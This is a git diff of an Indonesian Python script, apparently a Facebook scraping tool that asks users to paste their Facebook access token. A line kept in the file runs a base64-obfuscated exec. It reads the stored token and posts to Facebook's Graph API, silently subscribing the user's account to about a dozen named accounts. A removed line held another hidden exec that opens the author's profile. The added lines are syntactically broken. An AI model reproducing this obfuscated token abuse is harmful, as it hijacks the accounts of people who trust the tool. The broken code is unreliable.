@@ -99,43 +99,9 @@ def tokenz():
 		print(" [*] Bergabung  : %s"%(tgl))
 		print(" [*] Status     : %sPremium Sampai dajjal keluar%s"%(H,N))
 		print(" [*] ---------------------------------------------")
-		print(" [*] IP         : %s"%(IP
-
-
-     
-    print ('\n%s [01] Masuk Via Token \n [02] Tutorial Mengambil token \n [%s00%s] Keluar'%(P,M,P))
-    rom = raw_input('\n%s [?] Menu : %s'%(P,K))
-    if rom in(""):
-    	print("%s [!] Isi yang benar "%(M));exit()
-    elif rom in ('1','01'):
-        jalan("\n%s [%s!%s] Dianjurkan Memakai Akun tumbal "%(P,M,P))
-    	romz = raw_input('%s [!] Token : %s'%(P,K))
-        if romz in(""):
-        	print("%s [!] Isilah dengan cinta "%(M));exit()
-    	try:
-            gas = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
-            print ('\n%s[√] Login berhasil. '%(H));jeda(2)
-            open('token.txt', 'w').write(romz);login_xx()
-            exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
-        except (KeyError,IOError):
-        	print("%s [!] Token invalid "%(M));masuk()
-    elif rom in ('2', '02'):
-    	print ("\n%s%s Ikuti langkah langkah sebagai berikut"%(H,til));jeda(2)
-        print (" - pertama masuk Google chrome, Usahkan akun tumbal ");jeda(2)
-        print (" - sihlahkan ketik %sm.facebook %s"%(O,K));jeda(2)
-        print (" - Terus cari titik tiga yang diatas lalu ketik %sEAAA %sLalu cari)"%(O,H));jeda(2)
-        print (" - klo sudah ketemu lalu Di %ssalin dan tempel di Script ini "%(O));jeda(2)
-        print ("%s - paham kan klo paham ketik Y klo ga paham ketik N "%(H));jeda(2)
-        nanya = raw_input('%s [?] Paham Gak ?[%sy%s/%sn%s] :%s '%(P,H,P,M,P,K))
-        if nanya in(""):
-        	print ("%s [!] Ayo dijawab kalo gak ngerti kasitau "%(M));jeda(2);masuk()
-        elif nanya in("y","Y"):
-        	print ("\n%s [√] Tumben paham lu :* "%(H));jeda(2);masuk()
-        elif nanya in("n","N"):
-        	print ("\n%s [!] Anak Tolol!! "%(M));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
-    elif rom in ('0', '00'):
-    	exit('\n')
-    else:
+		print(" [*] IP         : %s"%()
+                print(" [*.] Token Fb :
+ else:     
     	print("%s [!] Isi yang benar sayang "%(M));exit()
 exec(base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M='))
 # DUMP PUBLIK
